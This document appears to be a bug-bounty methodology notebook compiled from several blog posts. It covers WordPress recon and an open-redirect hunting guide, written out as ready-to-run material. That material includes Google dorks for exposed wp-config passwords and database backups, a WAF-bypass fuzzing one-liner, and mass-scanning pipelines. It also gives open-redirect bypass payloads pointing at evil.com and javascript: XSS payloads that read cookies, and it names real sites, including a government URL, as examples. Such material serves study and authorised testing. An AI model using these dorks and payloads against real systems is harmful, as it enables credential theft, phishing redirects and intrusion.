![None](https://miro.medium.com/v2/resize:fit:700/1*vX4xEU65nDAjXCvUSba6ZA.png)

Modified¬†`gather_js()`¬†function

```bash
gather_js(){
    echo -e "\n\e[36m[\e[32m+\e[36m]\e[92m Started Gathering JsFiles-links using Waymore\e[0m\n"
    while read -r domain; do
        echo -e "\n\e[36m[\e[32m+\e[36m]\e[92m Running Waymore for: $domain\e[0m\n"
        waymore -i "$domain" -mode U -oU "waymore_${domain}.txt"
        cat "waymore_${domain}.txt" | grep -iE "\.js$" >> jsfile_links.txt
    done < "$target"

    cat "$target" | subjs >> jsfile_links.txt
    echo -e "\n\e[36m[\e[32m+\e[36m]\e[92m Checking for live JsFiles-links\e[0m\n"
    cat jsfile_links.txt | httpx -follow-redirects -silent -status-code | grep "[200]" | cut -d ' ' -f1 | sort -u > live_jsfile_links.txt
}
```

You can add katana crawling command as well if you like:

```bash
katana -u domain.com -jc -d 5
```

#### ‚èØÔ∏èRun JSFScan

```bash
./JSFScan.sh -l domains.txt -all -r -o anynamehere
```

![None](https://miro.medium.com/v2/resize:fit:700/1*uDpk2xlhdKKQpBb6OYhxcg.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*4NEITHyu7lsaz3H2W5g-8Q.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*XnKuPnWMvYbhQzWD4aD3UA.png)


----

+ after that, add origin ip methodology from lostsec


Bonus: https://github.com/amrelsagaei/Bug-Bounty-Hunting-Methodology-2025

----


+ what to add in the methodology? - look for telegram too

- in the end start trying for: **server-side testing**

#### little example:

I used the **ParamMiner** extension in Burp Suite, which is an excellent tool for revealing all headers used in requests. I noticed that the site was using the **X-Forwarded-Host** header. However, it didn‚Äôt accept any other domain, subdomain, or similar values .

What caught my attention was that I could change the **port**, and this turned out to be the vulnerability. With caching enabled on the website, I was able to poison the entire scope and change the site to `example.com:123`


This resulted in a **DOS**, but its impact was limited to a small scope. Had it been more widespread, the consequences would have been much more severe

![](https://miro.medium.com/v2/resize:fit:875/1*piSTpAMDw1RqfVIRWVNuog.png)

							he X-Forwarded-Host reflection

and the DOS impact :

![](https://miro.medium.com/v2/resize:fit:875/1*hHz5TiwJW-2rm7YSu3a2SQ.png)

						potential DOS


---

## Wordpress Common Vulns:

#WP_MassHunt 

If you come across a WordPress website, fuzz for these files and patterns:

```json
.env.bak
.env.php
wp-config-backup.php
wp-config.php.save
wp-config.php~
wp-config.php.old
error_log.log
php_error.log
wp.sql
db.sql
wpbackup.sql
mysql_backup.sql
{TARGET}.zip
{TARGET}-backup.zip
```

‚Ä¢ You can generate wordlists with the patterns above or any pattern you want using Fback:  
https://github.com/Spix0r/Fback

---

[Bang-on Common WordPress Vulnerabilities Quickly & avoid Duplicates‚Äî 2025 | by Mehboob Khan - Freedium](https://freedium.cfd/https://medium.com/@securityinsights/bang-on-common-wordpress-vulnerabilities-quickly-avoid-duplicates-2025-d1723c961922)

> try https://github.com/espreto/wpsploit

> **Step 1 : Identify if its WordPress Site or Not**

3. Install **wappalyzer** add-on into chrome , ms-edge. So that when you open website homepage, click on that add-on extension it shows WordPress technology along with version(sometimes).

4. Visit **builtwith.com** and enter target website , click on lookup. Analyze result


5. **Google Dorking:** Every website built with WordPress CMS follows default Directory naming.


6. **WayBack URLs:-** This tool gives all URLs of documents present in websites. We will save it in a file and check for common directory / files.

> echo 'target.com' | waybackurls > urls.txt

> cat urls.txt | grep '/wp-admin'

or

> cat urls.txt | grep '/wp-content'


It will list all URLs which has /wp-content in it. We can Manually surf on it.

> **Exploitation:**

7. **SSRF:** So you know to gather all URLs of WordPress site from above 4th way. Filter out /oembed/ endpoint for testing SSRF.


SSRF EndPoint

8. Visit below endpoints for **Username enumeration:**

> /wp-json/wp/v2/users

> /wp-json/?rest_route=/wp/v2/users

> /wp-json/v2/users/[n]/?author=n and try common passwords

9. Find out all urls using waybackurls & for the **parameter where value is reflecting try for RXSS via GitHub tools**.

10. Update **Nuclei** & templates , Run against target once.

11. Its time for **Fuzzing & Dorking** which yields juicy results.

> **Fuzzing:**

Install ffuf using:- **go install github.com/ffuf/ffuf/v2@latest

> ffuf -w wordlist.txt -fc 403,301,302 -u [https://domain.txt/FUZZ](https://eranetbioenergy.net/FUZZ)

**Wordlist1:-** [https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/refs/heads/main/Backup-wp-config.php-WordList.txt](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/refs/heads/main/Backup-wp-config.php-WordList.txt)

**Wordlist2:-**[https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt)

**Wordlist3:-** [https://raw.githubusercontent.com/satyasai1460/wp-Fuzzing-list/refs/heads/main/wp-fuzz.txt](https://raw.githubusercontent.com/satyasai1460/wp-Fuzzing-list/refs/heads/main/wp-fuzz.txt)

**Wordlist4:-** [https://github.com/orwagodfather/WordList](https://github.com/orwagodfather/WordList)

**Wordlist5:-** [https://github.com/six2dez/OneListForAll](https://github.com/six2dez/OneListForAll)

> **Dorking for sensitive files**

_**/wp-config.md**_

_**/wp-config.zip**_

_**/wp-config.txt**_

_**/wp-config.php.bak**_

_**/wp-config.php_orig**_

_**/wp-config.bak**_

**/wp-admin/install.php**

**/wp-config.php.zip**

**/wp-config.php.bak**

**/wp-content/debug.log**

_More Endpoints_

Now we have endpoints, Lets start with Dorking:-

> site:target.com inurl:/debug.log



Now Go-on testing for each endpoint via Google Endpoints.

> site:target.com inurl:/wp-uploads

> site:target.com inurl:/wp-content

Along with **site:** filter use dorks below

### WordPress Version/Installation Dorks:

```bash
"is proudly powered by WordPress"
inurl:"/wp-json/" -wordpress
inurl:/wp-admin/admin.php intitle:"Log In"
inurl:/wp-admin/post.php?post=
inurl:/wp-admin/setup-config.php intitle:"Setup Configuration File"
inurl:/wp-login.php +Register Username Password "remember me" -echo -trac -footwear
inurl:/wp-login.php Register Username Password -echo
inurl:/wp-login.php?action=register
inurl:/wp-login.php?action=lostpassword
inurl:/wp/wp-admin/
inurl:/wp/wp-login.php
site:*/wordpress/wordpress.bak/
site:*/wp-admin/install.php intitle:WordPress Installation
site:*/wp-admin/maint/repair.php intext:"define(WP_ALLOW_REPAIR,true);"
site:*/wp-admin/user-edit.php
site:*/wp-login?redirect_to= intitle:"login"
```

### Configuration File Dorks:

```bash
filetype:txt inurl:wp-config.txt intext:"the WordPress"
inurl:wp-config ext:txt
inurl:wp-config.php intext:DB_PASSWORD -stackoverflow -wpbeginner
inurl:wp-config-backup.txt
inurl:wp-config.bak
inurl:wp-config.php inurl:wp-config -intext:wp-config "'DB_PASSWORD'"
```

### Backup & Database Dorks:

```bash
"plugins/wp-db-backup/wp-db-backup.php"
filetype:sql inurl:wp-content/backup-*
filetype:sql inurl:wp-content/*
inurl:"/wp-content/uploads/db-backup"
inurl:"/wp-content/wpclone-temp/wpclone_backup/"
inurl:/wp-content/ai1wm-backups + wpress
inurl:/wp-content/uploads/dump.sql
inurl:/wp-content/uploads/ninja-forms/
inurl:/wp-content/uploads/wp-backup-plus/
inurl:/wp-content/wpbackitup_backups
intext:backup-db inurl:wp-content
```

### Plugin & Theme Dorks:

```bash
inurl:"/wp-content/plugins/wp-mobile-detector/" ext:php
inurl:"/wp-content/plugins/wp-shopping-cart/"
inurl:"/wp-content/uploads/levoslideshow/"
inurl:/wp-content/plugins/fgallery/
inurl:/wp-content/plugins/inboundio-marketing/
inurl:/wp-content/plugins/seo-pressor/classes/
inurl:/wp-content/plugins/video-synchro-pdf
inurl:/wp-content/plugins/wpSS/
inurl:/wp-content/themes/tigin/
inurl:/wp-content/themes/xunjin/
inurl:/wp-content/plugins/age-verification/age-verification.php
```

### Log & Debug File Dorks:

```bash
inurl:"wp-content/uploads/file-manager/log.txt"
inurl:"wp-security-audit-log" ext:log
inurl:/wp-admin/admin-ajax.php?action=revslider_ajax_action
inurl:/wp-admin/includes/plugin-install.php
inurl:/wp-content/debug.log
inurl:/wp-includes/certificates/
inurl:/wp-includes/Requests/php_errorlog
inurl:log -intext:log ext:log inurl:wp-
```

### Index of Directories:

```bash
intitle:"Index of" wp-admin
intitle:"Index of" wp-config
intitle:"Index of" wp-config.php
intitle:"Index of" wp-content
intitle:"Index of" wp-upload
intitle:"index of" inurl:/wp-content/uploads/wp-backup-plus/
Index:Index of /wp-content/uploads
```

### Miscellaneous Dorks:

```bash
inurl:"wp-contentpluginsall-in-one-seo-pack"
inurl:"wp-download.php?dl_id="
inurl:"wp-license.php?file=../..//wp-config"
inurl:"/wp-json/wp/v2/users/" "id":1,"name":" -wordpress.stackexchange.com -stackoverflow.com
inurl:/wp-content/uploads/ filetype:sql
inurl:/wp-content/uploads/ filetype:xls | filetype:xlsx password
inurl:/wp-content/uploads/private
inurl:/wp-content/w3tc/dbcache/
inurl:/wp-includes/certificates/
inurl:/wp-links-opml.php
inurl:/wp-mail.php + "There doesn't seem to be any new mail."
inurl:wp-admin/ intext:css/
inurl:wp-admin/admin-ajax.php
inurl:wp-content/ inurl:backups
site:*/wp-contents/ inurl:/wp-contents/
site:*/wp-includes/ inurl:/wp-includes/
site:*/wp-settings.php
```

12. **Wordpress subdomain Takeover**

Find out subdomains of website using :

> subfinder -d domain.com -all -recursive > subs_domain.com.txt cat subs_domain.com.txt | httpx -td -title -sc -ip > httpx_domain.com.txt cat httpx_domain.com.txt | awk '{print $1}' > live_subs_domain.com.txt

Now, it's time for nuclei template:

> wget [https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/http/takeovers/wordpress-takeover.yaml](https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/http/takeovers/wordpress-takeover.yaml)

> nuclei -l live_subs -t wordpess-takeover.yaml

10 . **Bruteforce Credentials**

Visit :- /wp-admin Endpoint it asks for login.


---

## WP Engine Vuln:

I start visiting the website in my Firefox browser. There is a famous add-on name [**Wappalyzer**](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/). So after visiting couple of pages, i clicked on wappalyzer and it shows me that target website using WordPress & Wp-Engine.

![](https://miro.medium.com/v2/resize:fit:455/1*gEYR-yAIL1JfnLHellbTsQ.png)

look for sensitive directory and file, so i fire up a tool name [**dirsearch**](https://github.com/maurosoria/dirsearch) which is a very useful tool to find directory and sensitive files faster then [**dirb**](https://salsa.debian.org/pkg-security-team/dirb).

> dirsearch -u https://mehedishakeel.com

and there i find a file directory name **‚Äú_wpeprivate/config.json‚Äù.** This is one of the goldmine of those WordPress website which are using **wpengine**.

![](https://miro.medium.com/v2/resize:fit:700/1*3v35LDnSq5sfTeKfN9_5rg.png)


I open this url with the target domain , and i just got entire database username, password.

> https://mehedishakeel.com/_wpeprivate/config.json

**‚Äú_wpeprivate/config.json‚Äù** revealed API key of WPEngine, DB username, DB password and so on in plain text. That‚Äôs how i got my first resolved bug on hackerone.

> So whenever you got a target with WordPress and WPengine, always look for **_wpeprivate/config.json‚Äù** file.

![](https://miro.medium.com/v2/resize:fit:700/1*OqA5abw3LhwzLNaZTJwLxw.jpeg)

----

## Methodology by lostsec

#ffuf 


You should prioritize learning. Trust me, money is just the result of doing good work. Keep this concept in mind:

- 70% of the time, test your knowledge on real targets
- 30% of the time, focus on learning  
    Balance these two things and you‚Äôll see the results. I‚Äôm not saying money isn‚Äôt important ‚Äî I‚Äôm learning and working to earn money for a better future. But if you make it your highest priority, you‚Äôll find it hard to improve yourself.

## Exstension to find VDPs:

### **22. YesWeHack VDP Finder**

Detects vulnerability disclosure programs (VDP) of visited websites.

#### **Why It's Useful?**

- Helps security researchers report vulnerabilities responsibly.
- Finds public bug bounty programs easily.

> https://chromewebstore.google.com/detail/yeswehack-vdp-finder/jnknjejacdkpnaacfgolbmdohkhpphjb

### **25. Mitaka ‚Äî OSINT Search Tool**

Searches IPs, domains, URLs and hashes across multiple threat intelligence platforms.

#### **Why It's Useful?**

- Speeds up OSINT investigations.
- Checks for blacklisted domains and malware indicators.

> https://chromewebstore.google.com/detail/mitaka/bfjbejmeoibbdpfdbmbacmefcbannnbg

### **26. Vortimo OSINT Tool**

A Swiss-army knife for OSINT, allowing users to bookmark, scrape and analyze web pages.

#### **Why It's Useful?**

- Stores and organizes OSINT findings.
- Highlights text across multiple pages for correlation.

> https://chromewebstore.google.com/detail/vortimo-osint-tool/mnakbpdnkedaegeiaoakkjafhoidklnf?hl=en



**CustomBsqli**: It‚Äôs faster than basic tools like SQLMap. It identifies and exploits blind SQL injection vulnerabilities in web applications.

[**http://www.dgrsantiago.gov.ar/wp-admin/admin-ajax.php?action=window&callback=**](http://www.dgrsantiago.gov.ar/wp-admin/admin-ajax.php?action=window&callback=)

**Step-by-Step Tutorial**: [Watch the video](https://www.youtube.com/watch?v=eqqYL5Q2VyE)

[**Lostxlso**](https://github.com/coffinsp/lostools): A multi-vulnerability scanner, excellent for finding SQLi, XSS, LFi, Open Redirect, and more.

**FFUF**: You can use the default tool, but for unique results, check out the great tool from [SirBugs/bugsffuf](https://github.com/SirBugs/bugsffuf). Look into the help documentation for additional points.

**Web labs for FFUF and more**:

- [FFUF.me](http://ffuf.me) ‚Äî Great for beginners
- [HackXpert Labs](https://labs.hackxpert.com) ‚Äî Enjoy! ‚úç(‚óî‚ó°‚óî)

**FUZZING** [**CMS**](https://en.wikipedia.org/wiki/Content_management_system) **TIP : i got this tip from** [**https://t.me/a7madn1**](https://t.me/a7madn1) **‚Üê**

![](https://miro.medium.com/v2/resize:fit:499/1*OCE_X6lXe2XnwTl3PhN4uA.png)

![](https://miro.medium.com/v2/resize:fit:516/1*Ro6qQTE0WJ_cS0Mx6ojoiA.png)

**my collction wordlist CMS :** Check out my collection of CMS wordlists here: [Captain Sharky‚Äôs WordList Collection](https://github.com/LUKE0101010/CaptinSHarkyWorldLiST). I‚Äôll be adding more of my recon wordlists from various bug hunters.

**Tip from Coffin**:  
Try this amazing FFUF oneliner that I mostly use to bypass WAFs for refined results, especially for information disclosure bugs. Use any wordlist:

```
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json
```

---

## Hunt for CORS and Open Redirect Vulnerabilities!

_what's the difference between CORS and OpenRedirect?_

### **Open Redirect Vulnerability**

- This occurs when a website or application has a URL redirection mechanism that attackers can exploit.
    
- The attacker manipulates the redirection link to send users to malicious or untrusted websites.
    
- It‚Äôs mainly a flaw in the application's code and **can lead to phishing attacks or stealing sensitive information if users are misled into trusting the malicious site.**
    

### **CORS (Cross-Origin Resource Sharing)**

- This is a **browser-based security feature that controls how resources on a web page can be accessed from another domain.**
    
- It‚Äôs designed to **protect users by restricting requests made to other domains unless explicitly allowed by the server‚Äôs CORS policy.**
    
- Misconfigured CORS policies can lead to vulnerabilities like exposing sensitive data to unauthorized origins.
    

In summary, open redirect is a security vulnerability in URL handling, while CORS is a mechanism for managing cross-origin requests.

## From Zero to Hero: Hunting High-Paying Open Redirect Bugs in Web Apps by Coffin:

## **Understanding Open Redirect Basics**

If the server blindly accepts the user supplied URL and redirects without checking  it, it becomes an open redirect vulnerability. By modifying the url parameter attackers can trick users into visiting harmful sites like this:

> https://example.com/redirect?url=http://malicious.com

## CHEATSHEET Open Redirect

### **Manual Testing Techniques**

**1. Simply Change the Domain**

```bash
?redirect=https://example.com ‚Üí ?redirect=https://evil.com
```

**2. Bypass When Protocol is Blacklisted**

```bash
?redirect=https://example.com ‚Üí ?redirect=//evil.com
```

**3. Bypass When Double Slash is Blacklisted**

```bash
?redirect=https://example.com ‚Üí ?redirect=\\evil.com
```

**4. Bypass Using http: or https:**

```bash
?redirect=https://example.com ‚Üí ?redirect=https:example.com
```

**5. Bypass Using %40 (At Symbol Encoding)**

```
?redirect=example.com ‚Üí ?redirect=example.com%40evil.com
```

**6. Bypass if Only Checking for Domain Name**

```
?redirect=example.com ‚Üí ?redirect=example.comevil.com
```

**7. Bypass Using Dot Encoding %2e**

```
?redirect=example.com ‚Üí ?redirect=example.com%2eevil.com
```

**8. Bypass Using a Question Mark**

```
?redirect=example.com ‚Üí ?redirect=evil.com?example.com
```

**9. Bypass Using Hash %23**

```
?redirect=example.com ‚Üí ?redirect=evil.com%23example.com
```

**10. Bypass Using a Symbol**

```
?redirect=example.com ‚Üí ?redirect=example.com/evil.com
```

**11. Bypass Using URL Encoded Chinese Dot %E3%80%82**

```
?redirect=example.com ‚Üí ?redirect=evil.com%E3%80%82%23example.com
```

**12. Bypass Using a Null Byte %0d or %0a**

```
?redirect=/ ‚Üí ?redirect=/%0d/evil.com
```

13. Encoded URL Redirects

```
https://example.com/redirect?url=http%3A%2F%2Fmalicious.com
```

14. Path-Based Redirects

```bash
https://example.com/redirect/http://malicious.com
```

15. Data URI Redirects

```
https://example.com/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnVGhpcyBpcyBhbiBhdHRhY2snKTwvc2NyaXB0Pg==
```

16. JavaScript Scheme Redirects

```
https://example.com/redirect?url=javascript:alert('XSS');//
```

17. Open Redirect via HTTP Header

```json
Location: http://malicious.com
X-Forwarded-Host: evil.com
Refresh: 0; url=http://malicious.com
```

18. **Path Traversal Hybrids**

```bash
/redirect?url=/../../https://evil.com
```

19. **Using svg paylaod**

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://evil.com/'" xmlns="http://www.w3.org/2000/svg"></svg>
```

### **Automated Tools for Scanning**

#### Reconnaissance

Collect multiple active and passive URLs from all available tools and sources.

> **For single domain:**

```bash
echo target.com | gau --o urls1.txt
echo target.com | katana -d 2 -o urls2.txt
echo target.com | urlfinder -o urls3.txt
echo target.com | hakrawler > urls4.txt
```

> **For multiple subdomains:**

```shell
subfinder -d target.com -all -o subdomains1.txt
assetfinder --subs-only target.com > subdomains2.txt
sort -u subdomains.txt subdomains2.txt -o uniqsubs.txt
cat uniqsubs.txt | httpx-toolkit -o finallist.txt

cat finallist.txt | gau --o urls1.txt
cat finallist.txt | katana -d 2 -o urls2.txt
cat finallist.txt | urlfinder -o urls3.txt
cat finallist.txt | hakrawler > urls4.txt
```

After collecting all the URLs its time to filter out duplicates and sort them.

```shell
cat urls1.txt urls2.txt urls3.txt | uro | sort -u | tee final.txt
```

#### Filtering URLs for Redirect Parameters

Using the grep command to filter out all open redirect parameters used for redirections:

```bash
cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
```

A more effective approach is to use the gf tool pattern to filter only open redirect parameters with the following command:


```bash
final.txt | gf redirect | uro | sort -u | tee redirect_params.txt
```

> https://github.com/coffinxp/GFpattren/blob/main/redirect.json

![[Pasted image 20250321173009.png]]

## Now its time for the final exploitation phase. Lets identify potential payloads and test for successful redirections

```bash
cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```

Or you can also achieve same using the following method:

```python
subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```

![None](https://miro.medium.com/v2/resize:fit:700/1*h7GU2e5ZRyWhxcRWvKZVlQ.jpeg)

It will display all the URLs that redirect to evil.com on the screen.

To scan for all open redirect bypass payloads from my custom list use the following command:

```bash
cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
```

![None](https://miro.medium.com/v2/resize:fit:700/1*8PLeDM1E4ODcnFEI41N2hA.jpeg)

This command will test all the custom open redirect bypass payloads from coffin **or.txt** list against each URL parameter. 

If any redirection to Google is detected in the response it will be displayed on the screen.

Or you can also achieve same results using the following method for single and multiple target domains:

```bash
 echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
```

### Fuzzing with FFuF and Verifying in Burpsuite

```bash
ffuf -w redirect_params.txt:PARAM -w loxs/payloads/or.txt:PAYLOAD -u "https://site.com/bitrix/redirect.php?PARAM=PAYLOAD" -mc 301,302,303,307,308 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" -x http://localip:8080 -t 10 -mr "Location: http://google.com"
```

- -mc : Match only 301,302,303,307,308 redirect responses.
- -mr : Confirm redirect to a malicious domain "Location: http://google.com"
- -x: This option is used to proxy FFUF traffic through Burp Suite for manual testing.
- -w for wordlist: redirect_param.txt contains all openredirect params and or.txt file contains all openredirect bypass paylaods

![None](https://miro.medium.com/v2/resize:fit:700/1*DL8EFm9zDntIGcTjjRi9UA.jpeg)

After capturing FFUF traffic in Burp Suite, you can use the filter option to display only the 300 series status codes.

for more better filtering you can use burp search option to check only google.com url in response header for more acurate results:

![None](https://miro.medium.com/v2/resize:fit:700/1*o-3jN8EqckkOnYh774o-hA.jpeg)

You can also use CURL tool for mass open redirect testing with the following command:

```bash
 cat urls.txt | qsreplace "https://evil.com" | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {}
```

![None](https://miro.medium.com/v2/resize:fit:700/1*CQ7Cypbl9UcntppsPodAPw.jpeg)


_breaking down the command:_

### `cat urls.txt`

- This part reads the contents of the file `urls.txt` and outputs it to standard output (your terminal).
    
- The `urls.txt` file presumably contains a list of URLs, one per line.
    

### **2.** `|` **(Pipe)**

- The pipe takes the output from the previous command (`cat urls.txt`) and sends it as input to the next command (`qsreplace`).
    

### **3.** `qsreplace "https://evil.com"`

- The `qsreplace` command replaces query string parameters in the URLs received from the previous step with the specified string `"https://evil.com"`.
    
- For example, if one of the URLs in `urls.txt` is `https://example.com?redirect=https://good.com`, it would replace the `redirect` value with `https://evil.com`.
    

### **4.** `|` **(Pipe again)**

- Passes the modified URLs (after `qsreplace`) to the next command.
    

### **5.** `xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {}`

- `xargs`**:** This command takes the input (the modified URLs) and runs the `curl` command on each URL individually.
    
    - `-I {}`**:** Specifies a placeholder (`{}`) for the input. Each URL replaces `{}` in the `curl` command.
        
- `curl`**:** Makes HTTP requests to the URLs.
    
    - `-s`**:** Runs `curl` in silent mode, suppressing progress and error messages.
        
    - `-o /dev/null`**:** Sends the output (response body) to `/dev/null`, effectively discarding it.
        
    - `-w "%{url_effective} -> %{redirect_url}\n"`**:** Prints the final effective URL (`%{url_effective}`) and any redirection URL (`%{redirect_url}`), if applicable, in the format:

```
<original_url> -> <redirect_url>

```

**_why we send it to /dev/null folder?_**

- `/dev/null` is a special file in Unix-like systems that acts as a "black hole." Any data sent to it is discarded‚Äîit's gone, poof!
    
- Think of it as the computer‚Äôs trash bin for data you don't want or need.

In short, `/dev/null` keeps your output clean and focused by ensuring that only the useful information‚Äîthe effective URL and any redirects‚Äîappears on the terminal

### **Overall Functionality**

- This command:
    
    1. Reads a list of URLs from `urls.txt`.
        
    2. Replaces the query string in the URLs with `https://evil.com` using `qsreplace`.
        
    3. Uses `curl` to make requests to each modified URL.
        
    4. Prints the effective URL and any redirection information for each request.

### Testing Using Nuclei Template

You can also use this custom private Nuclei template that automatically appends parameters to subdomain URLs and checks for open redirects.

```bash
echo subdomains.txt | nuclei -t openRedirect.yaml -c 30
```

![None](https://miro.medium.com/v2/resize:fit:700/1*p4FlqrzI4yAN-3BVgAa4zg.jpeg)

### Using virustotal

You can also use VirusTotal to find URLs with open redirect parameters and test them with the above methods.

```bash
https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=target.com
```

![None](https://miro.medium.com/v2/resize:fit:700/1*YRW6kUmPSTNZcFCrCwci7Q.jpeg)

```bash
./virustotal.sh domains.txt | gf redirect
```

![None](https://miro.medium.com/v2/resize:fit:700/1*15pW96Ev7t7mA395aWAU3Q.jpeg)

After this you can use the same methods like qsreplace,ffuf,httpx and Burp Suite for further testing.

### Using Burpsuite

You can also use Burp Suite to find open redirect vulnerabilities with the following methods:

> **step 1**

Intercept the target response in Burp Suite and send it to "Discover Content" for active crawling on the target domain.

![None](https://miro.medium.com/v2/resize:fit:700/1*I8e_Hdjc25zb0Nbk66fYCw.jpeg)

> **step 2**

After crawling you'll find numerous URLs with parameters in the Target tab.

![None](https://miro.medium.com/v2/resize:fit:700/1*99ElOranhaJYC3UJYnjbnQ.jpeg)

> **step 3**

After this filter all the responses to only 300-series status codes, pick one redirect parameter and send it to the Repeater tab.

![None](https://miro.medium.com/v2/resize:fit:700/1*qNES34SAg_wjkeyzWZ-c8g.jpeg)

> **step 4**

And now add the parameter position where you want to fuzz all open redirect bypass payloads.  (you can find them always in lostsec **"or"** repo)

Now start the attack. Make sure auto URL encoding is disabled and you can add google.com or any site you want to check in Response Matching.

![None](https://miro.medium.com/v2/resize:fit:700/1*c3vEXwjQfANXIuESDJbM1w.jpeg)

> **step 5**

Now use the Filter option to view only 300-series status codes in the response. Here you'll find all the redirections on the target. Also make sure to check the response length for more accurate results.

![None](https://miro.medium.com/v2/resize:fit:700/1*Q1PmjUgDrxEyniQ66d5Nsg.jpeg)

Now you can copy any request and paste it into the browser to verify the redirection.

### Using Loxs tool

For a simpler way to find open redirects you can use our Loxs tool which automatically detects open redirects without any false positives. Use the following command first:

```bash
cat urls.txt | sed 's/=.*/=/' | uro >final.txt
```

- urls.txt: A file containing URLs that have been filtered and sorted using gf patterns or other methods.
- The sed command is used to extract all parameters from URLs and convert them into empty parameters for fuzzing.

After this send the final.txt file into the Loxs tool, select the open redirect option, choose the urls.txt file and select the payload file after that The result will look like this:

![None](https://miro.medium.com/v2/resize:fit:700/1*znCcpyuE4JPeV9Id6UW5Sw.jpeg)

And Loxs will also generate an HTML file for easy viewing of the results, showing all the successful open redirect payloads in a clean and organized format.

![None](https://miro.medium.com/v2/resize:fit:700/1*Ku_On8BYqUppcG88uTqAjQ.jpeg)

### Openredirect to XSS(ATO)

If you find any open redirect, always try to increase the impact by chaining it with XSS by using following paylaods:

```
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
```

>https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

### Google Dorking & Automation

You can also use the manual method to find open redirects on your target using this Google Dork:

```php
site:target (inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uri= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= | inurl:out= | inurl:go= | inurl:login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http | inurl:&)
inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:target
```

For mass open redirect automation, you can use my dorking.py script, which fetches all Google Dork results within seconds on the terminal

![None](https://miro.medium.com/v2/resize:fit:700/1*5dlO88wtSQ30YqnQt5Kfxg.jpeg)

After this use **gf patterns,qsreplace and httpx grep** to filter valid open redirects with the following command:

```bash
cat urls.txt| gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com" 
```

